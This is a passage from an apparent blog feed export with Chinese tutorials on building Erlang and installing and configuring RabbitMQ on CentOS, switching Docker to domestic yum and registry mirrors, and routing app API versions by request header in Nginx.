class="line"><span class="meta">#</span> yum install -y libxslt-devel</span><br></pre></td></tr></table></figure><h2 id="3-2-编译安装wxWidgets"><a href="#3-2-编译安装wxWidgets" class="headerlink" title="3.2 编译安装wxWidgets"></a><strong>3.2 编译安装wxWidgets</strong></h2><p>wxWidgets是一个开源的跨平台的C++构架库（framework），它可以提供GUI（图形用户界面）和其它工具。wxWidgets支持在Erlang的编译安装过程中是非必需的，但Erlang的新GUI工具是基于wxWidgets开发的，因此要使用这些工具必须安装wxWidgets。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> wget https://github.com/wxWidgets/wxWidgets/releases/download/v3.0.4/wxWidgets-3.0.4.tar.bz2</span><br><span class="line"><span class="meta">#</span> bzip2 -d wxWidgets-3.0.4.tar.bz2</span><br><span class="line"><span class="meta">#</span> tar xf wxWidgets-3.0.4.tar</span><br><span class="line"><span class="meta">#</span> cd wxWidgets-3.0.4/</span><br><span class="line"><span class="meta">#</span> yum install -y gtk+-devel</span><br><span class="line"><span class="meta">#</span> yum install -y gtk2-devel binutils-devel</span><br><span class="line"><span class="meta">#</span> ./configure --with-opengl --enable-debug --enable-unicode</span><br><span class="line"><span class="meta">#</span> make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p><blockquote><p><strong>注意：</strong><br>此处需注意的是，gtk+-devel、gtk2-devel、binutils-devel是必需的依赖环境，否则wxWidgets的make过程会报错。</p></blockquote><h2 id="3-3-编译安装Erlang"><a href="#3-3-编译安装Erlang" class="headerlink" title="3.3 编译安装Erlang"></a><strong>3.3 编译安装Erlang</strong></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> tar zxf otp_src_18.3.tar.gz</span><br><span class="line"><span class="meta">#</span> cd otp_src_18.3</span><br><span class="line"><span class="meta">#</span> ./configure</span><br><span class="line"><span class="meta">#</span> make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>测试Erlang是否安装成功<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> erl</span><br><span class="line">Erlang/OTP 18 [erts-7.3] [source] [64-bit] [smp:4:4] [async-threads:10] [kernel-poll:false]</span><br><span class="line"></span><br><span class="line">Eshell V7.3  (abort with ^G)</span><br><span class="line"><span class="meta">1&gt;</span> halt().</span><br></pre></td></tr></table></figure></p><h1 id="4-安装配置RabbitMQ"><a href="#4-安装配置RabbitMQ" class="headerlink" title="4. 安装配置RabbitMQ"></a><strong>4. 安装配置RabbitMQ</strong></h1><p>RabbitMQ提供了yum安装、rpm安装、编译安装、二进制包等多种方式，此处采用的是二进制包直接解压使用。</p><h2 id="4-1-解压RabbitMQ二进制包并移动到指定目录"><a href="#4-1-解压RabbitMQ二进制包并移动到指定目录" class="headerlink" title="4.1 解压RabbitMQ二进制包并移动到指定目录"></a><strong>4.1 解压RabbitMQ二进制包并移动到指定目录</strong></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> tar xf rabbitmq-server-generic-unix-3.6.6.tar</span><br><span class="line"><span class="meta">#</span> mv rabbitmq_server-3.6.6 /data/program/rabbitmq</span><br></pre></td></tr></table></figure><p>配置环境变量<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> vim /etc/profile.d/rabbitmq.sh</span><br><span class="line">export PATH=/data/program/rabbitmq/sbin:$PATH</span><br><span class="line"><span class="meta">#</span> source /etc/profile</span><br></pre></td></tr></table></figure></p><h2 id="4-2-启动RabbitMQ服务"><a href="#4-2-启动RabbitMQ服务" class="headerlink" title="4.2 启动RabbitMQ服务"></a><strong>4.2 启动RabbitMQ服务</strong></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> rabbitmq-server -detached</span><br><span class="line"><span class="meta">#</span> rabbitmqctl status</span><br></pre></td></tr></table></figure><h2 id="4-3-开启web管理接口"><a href="#4-3-开启web管理接口" class="headerlink" title="4.3 开启web管理接口"></a><strong>4.3 开启web管理接口</strong></h2><p>RabbitMQ默认情况下近允许通过命令行来管理，在日常工作中多有不便，还好RabbitMQ自带了web管理界面，只需要启动插件便可以使用。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> rabbitmq-plugins enable rabbitmq_management</span><br></pre></td></tr></table></figure></p><p>使用浏览器访问</p><blockquote><p>http://[IP]:15672</p></blockquote><p>输入用户名和密码就可以访问web管理界面了。</p><h2 id="4-4-配置RabbitMQ用户"><a href="#4-4-配置RabbitMQ用户" class="headerlink" title="4.4 配置RabbitMQ用户"></a><strong>4.4 配置RabbitMQ用户</strong></h2><p>默认情况下，RabbitMQ的默认的guest用户只允许本机访问，如果需要远程访问，可以新增一个用户并配置远程；同时，由于RabbitMQ默认的账号用户名和密码都是guest。为了安全起见, 先删掉默认用户。</p><p><strong>新增远程管理用户rabbitmq</strong><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> rabbitmqctl add_user rabbitmq password</span><br><span class="line"><span class="meta">#</span> rabbitmqctl set_permissions -p "/" rabbitmq ".*" ".*" ".*"</span><br><span class="line"><span class="meta">#</span> rabbitmqctl set_user_tags rabbitmq administrator</span><br></pre></td></tr></table></figure></p><p><strong>删除默认用户guest</strong><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> rabbitmqctl delete_user guest</span><br><span class="line">Deleting user "guest" ...</span><br></pre></td></tr></table></figure></p><h2 id="4-5-RabbitMQ常用命令"><a href="#4-5-RabbitMQ常用命令" class="headerlink" title="4.5 RabbitMQ常用命令"></a><strong>4.5 RabbitMQ常用命令</strong></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">查看当前所有用户</span><br><span class="line"><span class="meta">#</span> rabbitmqctl list_users</span><br><span class="line">Listing users ...</span><br><span class="line">rabbitmq[administrator]</span><br><span class="line"></span><br><span class="line">查看默认guest用户的权限</span><br><span class="line"><span class="meta">#</span> rabbitmqctl list_user_permissions guest</span><br><span class="line"></span><br><span class="line">添加新用户</span><br><span class="line"><span class="meta">#</span> rabbitmqctl add_user username password</span><br><span class="line"></span><br><span class="line">设置用户tag</span><br><span class="line"><span class="meta">#</span> rabbitmqctl set_user_tags username administrator</span><br><span class="line"></span><br><span class="line">赋予用户默认vhost的全部操作权限</span><br><span class="line"><span class="meta">#</span> rabbitmqctl set_permissions -p / username ".*" ".*" ".*"</span><br><span class="line"></span><br><span class="line">查看用户的权限</span><br><span class="line"><span class="meta">#</span> rabbitmqctl list_user_permissions username</span><br></pre></td></tr></table></figure><h2 id="4-6-RabbitMQ用户角色"><a href="#4-6-RabbitMQ用户角色" class="headerlink" title="4.6 RabbitMQ用户角色"></a><strong>4.6 RabbitMQ用户角色</strong></h2><p><strong>RabbitMQ的用户角色分类：</strong></p><blockquote><p>none、management、policymaker、monitoring、administrator</p></blockquote><p><strong>RabbitMQ各类角色描述：</strong></p><blockquote><p><strong>none</strong><br>不能访问 management plugin</p></blockquote><blockquote><p><strong>management</strong><br>用户可以通过AMQP做的任何事外加：<br>列出自己可以通过AMQP登入的virtual hosts<br>查看自己的virtual hosts中的queues, exchanges 和 bindings<br>查看和关闭自己的channels 和 connections<br>查看有关自己的virtual hosts的“全局”的统计信息，包含其他用户在这些virtual hosts中的活动。</p></blockquote><blockquote><p><strong>policymaker</strong><br>management可以做的任何事外加：<br>查看、创建和删除自己的virtual hosts所属的policies和parameters</p></blockquote><blockquote><p><strong>monitoring</strong><br>management可以做的任何事外加：<br>列出所有virtual hosts，包括他们不能登录的virtual hosts<br>查看其他用户的connections和channels<br>查看节点级别的数据如clustering和memory使用情况<br>查看真正的关于所有virtual hosts的全局的统计信息</p></blockquote><blockquote><p><strong>administrator</strong><br>policymaker和monitoring可以做的任何事外加:<br>创建和删除virtual hosts<br>查看、创建和删除users<br>查看创建和删除permissions<br>关闭其他用户的connections</p></blockquote><h1 id="5-一些踩到的坑"><a href="#5-一些踩到的坑" class="headerlink" title="5. 一些踩到的坑"></a><strong>5. 一些踩到的坑</strong></h1><h2 id="5-1-关于编译环境"><a href="#5-1-关于编译环境" class="headerlink" title="5.1 关于编译环境"></a><strong>5.1 关于编译环境</strong></h2><p>编译安装Erlang的时候会出现报错：</p><blockquote><p>jinterface : No Java compiler found</p></blockquote><p>可以通过安装jdk来解决，如果有gcc环境，无需安装jdk，可以在configure时增加 –disable-javac来跳过警告。</p><h2 id="5-2-重启服务器后，RabbitMQ用户丢失问题"><a href="#5-2-重启服务器后，RabbitMQ用户丢失问题" class="headerlink" title="5.2 重启服务器后，RabbitMQ用户丢失问题"></a><strong>5.2 重启服务器后，RabbitMQ用户丢失问题</strong></h2><p>在部署配置完成后，重启了一次服务器，服务器启动后重新启动RabbitMQ服务，结果神奇的发现RabbitMQ用户丢失了。<br>原因如下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RabbitMQ数据是根据当前hostname作为node节点作为数据名保存</span><br><span class="line"><span class="meta">#</span> ls /data/program/rabbitmq/var/lib/rabbitmq/mnesia/</span><br><span class="line">rabbit@Centos7-01  rabbit@Centos7-01.pid  rabbit@Centos7-01-plugins-expand</span><br></pre></td></tr></table></figure></p><p>重启服务器之前我修改了hostname，所以重启之后，RabbitMQ服务使用新的hostname来保存数据。</p><p>可以通过添加RabbitMQ固定节点名字，保证数据文件不变。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> echo 'NODENAME=rabbit@info' | tee -a etc/rabbitmq/rabbitmq-env.conf</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-RabbitMQ介绍&quot;&gt;&lt;a href=&quot;#1-RabbitMQ介绍&quot; class=&quot;headerlink&quot; title=&quot;1. RabbitMQ介绍&quot;&gt;&lt;/a&gt;&lt;strong&gt;1. RabbitMQ介绍&lt;/strong&gt;&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;RabbitMQ是实现AMQP（高级消息队列协议）的消息中间件的一种，最初起源于金融系统，用于在分布式系统中存储转发消息，在易用性、扩展性、高可用性等方面表现不俗。RabbitMQ主要是为了实现系统之间的双向解耦而实现的。当生产者大量产生数据时，消费者无法快速消费，那么需要一个中间层。保存这个数据。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;AMQP，即Advanced Message Queuing Protocol，高级消息队列协议，是应用层协议的一个开放标准，为面向消息的中间件设计。消息中间件主要用于组件之间的解耦，消息的发送者无需知道消息使用者的存在，反之亦然。AMQP的主要特征是面向消息、队列、路由（包括点对点和发布/订阅）、可靠性、安全。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;RabbitMQ是一个开源的AMQP实现，服务器端用Erlang语言编写，支持多种客户端，如：Python、Ruby、.NET、Java、JMS、C、PHP、ActionScript、XMPP、STOMP等，支持AJAX。用于在分布式系统中存储转发消息，在易用性、扩展性、高可用性等方面表现不俗。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;---以上内容我抄的
&lt;/code&gt;&lt;/pre&gt;&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://blog.unixmen.cn/categories/Linux/"/>
    
      <category term="Centos" scheme="http://blog.unixmen.cn/categories/Linux/Centos/"/>
    
      <category term="RabbitMQ" scheme="http://blog.unixmen.cn/categories/Linux/Centos/RabbitMQ/"/>
    
    
      <category term="Centos" scheme="http://blog.unixmen.cn/tags/Centos/"/>
    
      <category term="RabbitMQ" scheme="http://blog.unixmen.cn/tags/RabbitMQ/"/>
    
  </entry>
  
  <entry>
    <title>配置Docker使用国内镜像源及镜像加速器</title>
    <link href="http://blog.unixmen.cn/2018/04/26/%E9%85%8D%E7%BD%AEdocker%E4%BD%BF%E7%94%A8%E5%9B%BD%E5%86%85%E9%95%9C%E5%83%8F%E6%BA%90%E5%8F%8A%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F%E5%99%A8/"/>
    <id>http://blog.unixmen.cn/2018/04/26/配置docker使用国内镜像源及镜像加速器/</id>
    <published>2018-04-25T16:00:00.000Z</published>
    <updated>2018-06-11T14:53:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>因为众所周知的原因，在国内访问docker官方yum源经常会出现不可知状态，为了正常使用docker，我们需要将docker yum源修改为国内yum源来解决访问慢或者无法访问的问题。<br>目前国内大多数开放镜像站都提供了docker yum源，如：阿里云、USTC等，此处以阿里云为例。</p><h2 id="1-修改docker-ce-repo文件，配置国内镜像站地址"><a href="#1-修改docker-ce-repo文件，配置国内镜像站地址" class="headerlink" title="1. 修改docker-ce.repo文件，配置国内镜像站地址"></a><strong>1. 修改docker-ce.repo文件，配置国内镜像站地址</strong></h2><p>docker-ce.repo文件可从阿里云或USTC镜像站下载，阿里云下载地址：<a href="https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo" target="_blank" rel="noopener">https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</a></p><blockquote><p>不知为何，阿里云与USTC镜像站上默认的docker-ce.repo文件内部地址均是指向docker官方站<a href="https://download-stage.docker.com" target="_blank" rel="noopener">https://download-stage.docker.com</a> 这样导致直接下载下来的repo文件无法正常使用，需要将baseurl修改为国内镜像站的地址。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> vim /etc/yum.repos.d/docker-ce.repo</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sed -i <span class="string">'s@https://download-stage.docker.com/linux/centos/7/@https://mirrors.aliyun.com/docker-ce/linux/centos/7/@g'</span> /etc/yum.repos.d/docker-ce.repo</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sed -i <span class="string">'s@https://download-stage.docker.com/linux/centos/gpg@https://mirrors.aliyun.com/docker-ce/linux/centos/gpg@g'</span> /etc/yum.repos.d/docker-ce.repo</span></span><br></pre></td></tr></table></figure></p></blockquote><p>修改完成后，yum安装docker就可以直接使用国内yum源了。</p><a id="more"></a><h2 id="2-修改-etc-docker-daemon-json文件，配置docker镜像加速器"><a href="#2-修改-etc-docker-daemon-json文件，配置docker镜像加速器" class="headerlink" title="2. 修改/etc/docker/daemon.json文件，配置docker镜像加速器"></a><strong>2. 修改/etc/docker/daemon.json文件，配置docker镜像加速器</strong></h2><p>配置完docker的国内yum源仅仅解决了yum安装docker时的访问问题，但在docker实际使用中还面临另外一个问题；<br>docker默认镜像仓库Docker Hub服务器位于国外，因此在国内访问的时候依然会出现各种故障，为此docker提供了一个镜像加速器的设置，<br>可以通过配置位于国内的<strong>镜像加速器</strong>来加速docker镜像的拉取。<br>Docker 官方和国内很多云服务商都提供了国内加速器服务，例如：</p><blockquote><p><a href="https://docs.docker.com/registry/recipes/mirror/#use-case-the-china-registry-mirror" target="_blank" rel="noopener">Docker 官方提供的中国 registry mirror</a><br><a href="https://cr.console.aliyun.com/#/accelerator" target="_blank" rel="noopener">阿里云加速器</a><br><a href="https://www.daocloud.io/mirror#accelerator-doc" target="_blank" rel="noopener">DaoCloud 加速器</a><br>后两者需要注册相关账号才可以使用。</p></blockquote><p>修改/etc/docker/daemon.json文件，添加以下内容，如此文件不存在则创建之；<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> vim /etc/docker/daemon.json</span></span><br><span class="line">&#123;</span><br><span class="line">"registry-mirrors": [</span><br><span class="line">"https://registry.docker-cn.com"</span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>修改完成后，需重启服务生效；<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> systemctl daemon-reload</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> systemctl restart docker</span></span><br></pre></td></tr></table></figure></p><p>到此为止，可以愉快的使用docker了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;因为众所周知的原因，在国内访问docker官方yum源经常会出现不可知状态，为了正常使用docker，我们需要将docker yum源修改为国内yum源来解决访问慢或者无法访问的问题。&lt;br&gt;目前国内大多数开放镜像站都提供了docker yum源，如：阿里云、USTC等，此处以阿里云为例。&lt;/p&gt;
&lt;h2 id=&quot;1-修改docker-ce-repo文件，配置国内镜像站地址&quot;&gt;&lt;a href=&quot;#1-修改docker-ce-repo文件，配置国内镜像站地址&quot; class=&quot;headerlink&quot; title=&quot;1. 修改docker-ce.repo文件，配置国内镜像站地址&quot;&gt;&lt;/a&gt;&lt;strong&gt;1. 修改docker-ce.repo文件，配置国内镜像站地址&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;docker-ce.repo文件可从阿里云或USTC镜像站下载，阿里云下载地址：&lt;a href=&quot;https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;不知为何，阿里云与USTC镜像站上默认的docker-ce.repo文件内部地址均是指向docker官方站&lt;a href=&quot;https://download-stage.docker.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://download-stage.docker.com&lt;/a&gt; 这样导致直接下载下来的repo文件无法正常使用，需要将baseurl修改为国内镜像站的地址。&lt;br&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; vim /etc/yum.repos.d/docker-ce.repo&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; sed -i &lt;span class=&quot;string&quot;&gt;&#39;s@https://download-stage.docker.com/linux/centos/7/@https://mirrors.aliyun.com/docker-ce/linux/centos/7/@g&#39;&lt;/span&gt; /etc/yum.repos.d/docker-ce.repo&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; sed -i &lt;span class=&quot;string&quot;&gt;&#39;s@https://download-stage.docker.com/linux/centos/gpg@https://mirrors.aliyun.com/docker-ce/linux/centos/gpg@g&#39;&lt;/span&gt; /etc/yum.repos.d/docker-ce.repo&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;修改完成后，yum安装docker就可以直接使用国内yum源了。&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://blog.unixmen.cn/categories/Linux/"/>
    
      <category term="Docker" scheme="http://blog.unixmen.cn/categories/Linux/Docker/"/>
    
    
      <category term="docker" scheme="http://blog.unixmen.cn/tags/docker/"/>
    
      <category term="镜像源" scheme="http://blog.unixmen.cn/tags/%E9%95%9C%E5%83%8F%E6%BA%90/"/>
    
  </entry>
  
  <entry>
    <title>使用Nginx来配置服务端兼容APP接口多版本</title>
    <link href="http://blog.unixmen.cn/2018/03/20/Nginx+APP%E6%8E%A5%E5%8F%A3%E5%A4%9A%E7%89%88%E6%9C%AC%E5%85%BC%E5%AE%B9/"/>
    <id>http://blog.unixmen.cn/2018/03/20/Nginx+APP接口多版本兼容/</id>
    <published>2018-03-19T16:00:00.000Z</published>
    <updated>2018-06-11T14:53:04.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>移动互联网时代，讲究的是快速迭代，为了完善产品功能，一款APP需要不断的更新版本发布功能；而为了不影响用户体验，很多时候我们无法做到每个版本都强制用户更新；这样一来势必要保证APP多版本共存，作为APP与服务端交互的交互的api接口也将存在多个接口共存的情况，所以，我们必须考虑到如何实现APP接口多版本共存。</p></blockquote><h1 id="1-APP接口多版本共存的几种实现方式"><a href="#1-APP接口多版本共存的几种实现方式" class="headerlink" title="1. APP接口多版本共存的几种实现方式"></a><strong>1. APP接口多版本共存的几种实现方式</strong></h1><h2 id="1-1-URL请求中加入版本信息"><a href="#1-1-URL请求中加入版本信息" class="headerlink" title="1.1 URL请求中加入版本信息"></a><strong>1.1 URL请求中加入版本信息</strong></h2><blockquote><p>例如：<br><a href="http://www.xxx.com/api.xxx?version=v1" target="_blank" rel="noopener">www.xxx.com/api.xxx?version=v1</a><br><a href="http://www.xxx.com/api.xxx?version=v2" target="_blank" rel="noopener">www.xxx.com/api.xxx?version=v2</a></p></blockquote><h2 id="1-2-使用不同子域名来区分不同版本的api接口"><a href="#1-2-使用不同子域名来区分不同版本的api接口" class="headerlink" title="1.2 使用不同子域名来区分不同版本的api接口"></a><strong>1.2 使用不同子域名来区分不同版本的api接口</strong></h2><blockquote><p>例如：<br>api1.xxx.com<br>api2.xxx.com</p></blockquote><h2 id="1-3-URL中加入不同版本路径来区分不同版本的api接口"><a href="#1-3-URL中加入不同版本路径来区分不同版本的api接口" class="headerlink" title="1.3 URL中加入不同版本路径来区分不同版本的api接口"></a><strong>1.3 URL中加入不同版本路径来区分不同版本的api接口</strong></h2><blockquote><p>例如：<br><a href="http://www.xxx.com/v1/api" target="_blank" rel="noopener">www.xxx.com/v1/api</a><br><a href="http://www.xxx.com/v2/api" target="_blank" rel="noopener">www.xxx.com/v2/api</a></p></blockquote><h2 id="1-4-在URL提交header中加入版本信息"><a href="#1-4-在URL提交header中加入版本信息" class="headerlink" title="1.4 在URL提交header中加入版本信息"></a><strong>1.4 在URL提交header中加入版本信息</strong></h2><blockquote><p>例如：<br>header信息中直接添加一个字段：http_AppVersion = 1</p></blockquote><a id="more"></a><h1 id="2-我们选择的方案"><a href="#2-我们选择的方案" class="headerlink" title="2. 我们选择的方案"></a><strong>2. 我们选择的方案</strong></h1><p>在我们的技术选型过程中，不远将版本信息暴露在URL中，因此我们选择将版本信息放在header中，通过服务端来判断app版本信息并将请求分发到不同的接口服务上。<br>因此，我们选择在接口服务前面加一个Nginx来反代请求并分发，而Nginx原生支持用户自定义header，所以我们只需要在提交的header信息中定义一个http_AppVersion字段，APP端请求到Nginx服务器，Nginx服务器根据请求过来的header信息中的http_AppVersion字段值将不同版本的APP请求转发的不同的api接口服务上。</p><h1 id="3-Nginx的具体配置"><a href="#3-Nginx的具体配置" class="headerlink" title="3. Nginx的具体配置"></a><strong>3. Nginx的具体配置</strong></h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">if ($http_AppVersion = "1_0_1") &#123;</span><br><span class="line">proxy_pass https://api1.xxx.com/1_0_1$request_uri;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">if ($http_AppVersion = "1.0.2") &#123;</span><br><span class="line">proxy_pass https://api1.xxx.com/1_0_2$request_uri;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">if ($http_AppVersion = "1.0.3") &#123;</span><br><span class="line">proxy_pass https://api1.xxx.com/1_0_3$request_uri;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">if ($http_AppVersion = "1.0.4") &#123;</span><br><span class="line">proxy_pass https://api1.xxx.com/1_0_4$request_uri;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">if ($http_AppVersion = "") &#123;</span><br><span class="line">proxy_pass https://api1.xxx.com/1_0_1$request_uri;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;移动互联网时代，讲究的是快速迭代，为了完善产品功能，一款APP需要不断的更新版本发布功能；而为了不影响用户体验，很多时候我们无法做到每个版本都强制用户更新；这样一来势必要保证APP多版本共存，作为APP与服务端交互的交互的api接口也将存在多个接口共存的情况，所以，我们必须考虑到如何实现APP接口多版本共存。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;1-APP接口多版本共存的几种实现方式&quot;&gt;&lt;a href=&quot;#1-APP接口多版本共存的几种实现方式&quot; class=&quot;headerlink&quot; title=&quot;1. APP接口多版本共存的几种实现方式&quot;&gt;&lt;/a&gt;&lt;strong&gt;1. APP接口多版本共存的几种实现方式&lt;/strong&gt;&lt;/h1&gt;&lt;h2 id=&quot;1-1-URL请求中加入版本信息&quot;&gt;&lt;a href=&quot;#1-1-URL请求中加入版本信息&quot; class=&quot;headerlink&quot; title=&quot;1.1 URL请求中加入版本信息&quot;&gt;&lt;/a&gt;&lt;strong&gt;1.1 URL请求中加入版本信息&lt;/strong&gt;&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;例如：&lt;br&gt;&lt;a href=&quot;http://www.xxx.com/api.xxx?version=v1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;www.xxx.com/api.xxx?version=v1&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://www.xxx.com/api.xxx?version=v2&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;www.xxx.com/api.xxx?version=v2&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1-2-使用不同子域名来区分不同版本的api接口&quot;&gt;&lt;a href=&quot;#1-2-使用不同子域名来区分不同版本的api接口&quot; class=&quot;headerlink&quot; title=&quot;1.2 使用不同子域名来区分不同版本的api接口&quot;&gt;&lt;/a&gt;&lt;strong&gt;1.2 使用不同子域名来区分不同版本的api接口&lt;/strong&gt;&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;例如：&lt;br&gt;api1.xxx.com&lt;br&gt;api2.xxx.com&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1-3-URL中加入不同版本路径来区分不同版本的api接口&quot;&gt;&lt;a href=&quot;#1-3-URL中加入不同版本路径来区分不同版本的api接口&quot; class=&quot;headerlink&quot; title=&quot;1.3 URL中加入不同版本路径来区分不同版本的api接口&quot;&gt;&lt;/a&gt;&lt;strong&gt;1.3 URL中加入不同版本路径来区分不同版本的api接口&lt;/strong&gt;&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;例如：&lt;br&gt;&lt;a href=&quot;http://www.xxx.com/v1/api&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;www.xxx.com/v1/api&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://www.xxx.com/v2/api&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;www.xxx.com/v2/api&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
